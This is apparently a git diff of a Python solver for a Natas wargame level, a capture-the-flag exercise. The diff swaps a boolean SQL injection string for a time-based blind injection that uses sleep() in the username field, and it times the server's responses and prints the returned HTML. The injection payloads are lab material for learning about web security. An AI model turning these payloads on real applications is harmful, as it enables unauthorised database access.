@@ -3,6 +3,7 @@
 
 import requests
 import time
+from bs4 import BeautifulSoup
 from typing import Optional
 
 from natas_utils import *
@@ -19,28 +20,28 @@ def solve(url: str, login: LevelLogin) -> Optional[str]:
     # that's executed.
 
     success_start = time.perf_counter()
-    for _ in range(10):
-        success_params = {
-            "username": "natas18\" or 1=1",
-            "submit": "Check existence",
-            "debug": "true",
-        }
-        # no users output here because the `echo` lines are commented out in the
-        # source code
-        post_response = requests.post(url, auth=login, data=success_params)
+    success_params = {
+        "username": "natas18\" or if(1, sleep(0.5), null) # ",
+        "submit": "Check existence",
+        "debug": "true",
+    }
+    # no users output here because the `echo` lines are commented out in the
+    # source code
+    response = requests.get(url, auth=login, params=success_params)
     success_end = time.perf_counter()
+    print(BeautifulSoup(response.text, "html.parser").find("body").prettify())
 
     fail_start = time.perf_counter()
-    for _ in range(10):
-        fail_params = {
-            "username": "natas18\" aaaaaa aaaa aaa - + + * + aaaaaa",
-            "submit": "Check existence",
-            "debug": "true",
-        }
-        # no users output here because the `echo` lines are commented out in the
-        # source code
-        post_response = requests.post(url, auth=login, data=fail_params)
+    fail_params = {
+        "username": "natas18\" or if(0, sleep(0.5), null) # ",
+        "submit": "Check existence",
+        "debug": "true",
+    }
+    # no users output here because the `echo` lines are commented out in the
+    # source code
+    response = requests.post(url, auth=login, params=fail_params)
     fail_end = time.perf_counter()
+    print(BeautifulSoup(response.text, "html.parser").find("body").prettify())
 
     print(success_end - success_start)
     print(fail_end - fail_start)
